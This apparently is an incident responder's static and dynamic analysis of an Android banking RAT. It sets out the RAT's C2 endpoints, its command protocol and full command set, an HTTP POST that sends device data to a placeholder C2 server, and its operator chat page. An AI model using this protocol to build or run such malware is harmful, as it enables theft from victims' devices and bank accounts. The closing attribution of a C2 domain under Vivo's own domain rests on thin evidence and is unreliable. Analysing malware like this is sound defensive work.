# C2 Communication Analysis

**Note:** This document is based on **static analysis only** (string decryption + bytecode analysis).  
No network traffic was captured. Dynamic analysis (sandbox/MITM) required for full network IOCs.

---

## C2 Architecture

```
┌──────────────┐    WebSocket (wss://)    ┌──────────────┐
│ Victim Device│ ←────────────────────→  │ C2 Server    │
│              │                          │              │
│ e0 class     │                          │ PHP Backend  │
│ (OkHttp3 WS) │                          │ /yaarsa/     │
│              │    HTTP POST             │ private/     │
│ e0.B()       │ ─────────────────────→  │ yarsap_80541 │
│ (error logs) │                          │ .php         │
└──────────────┘                          └──────────────┘
       │
       │  ws://127.0.0.1:8080/
       ▼
┌──────────────┐
│ WebView      │ ← cht.html (operator chat)
│ (cht.html)   │   mybridge.sendit()
└──────────────┘   ↕ Java bridge
```

---

## Server Endpoints (Statically Confirmed)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/yaarsa/private/yarsap_80541.php` | WebSocket / POST | Main C2 endpoint |
| `/yaarsa/private/log_error.php` | POST | Error reporting |
| `/config.json` | GET | Remote configuration |

> **IP/Domain:** Stored in Unicode-obfuscated strings. Not recoverable statically.  
> Pattern: `http://5...` (truncated — begins with `5`, possibly `5x.` IP range).

---

## WebSocket Connection Parameters

```json
{
    "Deviceid": "<device_unique_id>",
    "Slr_client": "<client_type>",
    "subc": "<subscription_group>",
    "conk": "<connection_key>",
    "sidf": "<session_id_field>",
    "itype": "<installation_type>"
}
```

**Authentication flow:**
1. Device connects via WebSocket
2. Sends `join` with device credentials
3. Server responds with `[AST-PAS]` auth marker
4. Session keys `[:K3R1:]` exchanged
5. `rckey` (AES key for .bt files) distributed
6. Operator chat via `cht.html` becomes active

---

## Message Protocol

### Format
```
COMMAND<:CS:>DATA___CMD_END___
```

### Example Messages (reconstructed from string decryption)

```
# Operator → Device
browser<:CS:>https://bkash.com___CMD_END___
screen<:CS:>___CMD_END___
ject<:CS:>1___CMD_END___          ← inject 1.bt overlay
rckey<:CS:>BASE64_KEY___CMD_END___ ← distribute AES key for .bt

# Device → Operator
ServerSay: <data>
LockType: Password , Pass: 1234   ← captured PIN
Live Key-logs: <keystrokes>
img=BASE64_SCREENSHOT
```

### Base64-encoded URL Protocol
```
bnVsbDw6Q1M6Pg==  → decoded: "null<:CS:>"
aHR0cHM6Ly9nb29nbGUuY29tPDpDUzo+bQ==  → decoded: "https://google.com<:CS:>m"
```

---

## Complete Command Reference

### Surveillance Commands

| Command | Subcommand | Description |
|---------|-----------|-------------|
| `screen` | — | Take silent screenshot |
| `livescreen` | — | Start continuous screen stream |
| `livscr` | — | Live screen (alternate) |
| `scread` | — | Screen reader (accessibility data) |
| `micm` | — | Start microphone recording |
| `keystrokes` | — | Retrieve keylogger buffer |
| `location` | — | Get GPS coordinates |
| `clip` | — | Read clipboard content |
| `activities` | — | Get recent app activity |
| `notifications` | — | Get notifications |
| `visitedlinks` | — | Get browser history |
| `visitedapps` | — | Get app usage history |

### Communication Commands

| Command | Subcommand | Description |
|---------|-----------|-------------|
| `SMS` / `sms` | — | Read SMS inbox |
| `smsg` | — | Send SMS |
| `call` | — | Access call log |
| `blker` | `cuz`/`ttyp` | Block calls/SMS from target |
| `chat` | — | Open operator chat panel |
| `addA` | — | Add contact |

### Financial Attack Commands

| Command | Description |
|---------|-------------|
| `ject` | Inject banking overlay script (.bt file) |
| `browsz` | Open URL (for overlay redirect) |
| `browser` | Open URL in victim's browser |
| `lock` / `lckdis` | Lock/unlock screen for transaction window |
| `snap` | Screenshot (capture transaction confirmation) |

### Persistence & Control

| Command | Description |
|---------|-------------|
| `lock` | Device lock control |
| `addA` | Add attacker's contact |
| `cmnd` | Execute device command |
| `reip` | Update C2 server IP (redirect) |
| `rckey` | Distribute AES key for .bt overlay files |
| `update` | Self-update the malware APK |
| `botl` / `bot.` | Bot state management |

### Monetization Commands

| Command | Description |
|---------|-------------|
| `mining` | Start/stop cryptocurrency miner |
| `miner` | Miner status/config (cwrkr, lgd, pol) |
| `tols` | Start/stop DoS engine |
| `crtr` / `crty` | DoS target/type configuration |
| `turl` / `ttype` | DoS target URL and type |

### RAT Commands

| Command | Description |
|---------|-------------|
| `terminal` | Open remote shell / Telnet |
| `telnet` | Telnet with host/user/pass/port |
| `fetch` | Download file from URL |
| `upload` | Upload file to C2 |
| `clone` | Clone app data (App.BAK.SYNC/LOAD) |
| `filehash` | Get file hash |
| `filedata` | Exfiltrate file |
| `srch` | Search files by path |
| `location` | Copy/move files |

---

## HTTP POST Channel (Error Reporting)

```http
POST /yaarsa/private/log_error.php HTTP/1.1
Host: [C2_SERVER]
Content-Type: application/x-www-form-urlencoded

red_ip=<c2_ip>&user_email=<device_id>&<error_data>
```

Headers used:
```
User-Agent: Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) ...
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive
Proxy-agent: JavaProxy
```

---

## IP Intelligence Queries (Victim IP Discovery)

The malware queries public services to discover the victim's external IP:

```
GET http://checkip.amazonaws.com
GET https://icanhazip.com
GET https://ifconfig.me/ip
```

This IP is likely sent to the C2 to help operators track victims geographically and avoid detection from known VPN/datacenter IPs.

---

## cht.html — Operator Interface

```html
<!-- Operator types commands here -->
<input type="text" id="chatInput" placeholder="Type a message...">

<!-- Send via Android WebView Java bridge -->
<script>
function sendMessage() {
    const text = inputField.value.trim();
    if (text) {
        mybridge.sendit(text);  // → Java native → e0.g WebSocket
    }
}
</script>
```

The `[NAME]` placeholder in `<h3>[NAME]</h3>` is filled with the device name by the malware before loading the WebView. This creates a personalized operator panel per victim device.

---

## Dynamic Analysis Recommendations

To capture full network IOCs:

1. **ANY.RUN** or **Hybrid Analysis** — submit outer APK hash
2. **Frida hook** `e0.C()` — logs WebSocket URL before connection
3. **mitmproxy** on rooted device — intercept HTTPS traffic
4. **Wireshark** on network gateway — capture initial WebSocket handshake

Expected captures:
- WebSocket `wss://[C2_IP_OR_DOMAIN]/yaarsa/private/yarsap_80541.php`
- `Upgrade: websocket` HTTP header
- Initial `join` message with device fingerprint
- `[AST-PAS]` response from server

---

## ✅ CONFIRMED C2 DOMAIN (Dynamic Analysis)

**Method:** Wireshark capture on victim's Vivo device  
**Captured by:** Incident responder  

### C2 Domain

```
asia-vpushonrt-stsdk.vivoglobal.com:443
```

### Traffic Pattern (Wireshark)

```
192.168.68.102:41882 → 192.168.68.105:8088
HTTP CONNECT asia-vpushonrt-stsdk.vivoglobal.com:443 HTTP/1.1

→ TCP SYN/ACK handshake completed
→ HTTPS/WSS tunnel established
→ C2 communication encrypted inside tunnel
```

### Domain Mimicry Technique

The malware uses `vivoglobal.com` (Vivo's official domain) as a **parent domain** with a fake subdomain designed to look like a Vivo SDK endpoint:

- `vpushonrt` → mimics "Vivo Push Notification Real-Time"
- `stsdk` → mimics "SDK"
- `asia` → regional prefix for legitimacy

On a Vivo phone, this traffic appears identical to legitimate Vivo system service traffic — evading both user suspicion and network-level monitoring.

### Browser Probe Result

```
GET https://asia-vpushonrt-stsdk.vivoglobal.com
Response: "1"   ← C2 server alive indicator
```

### Reported To

- vivoglobal.com abuse team ✅
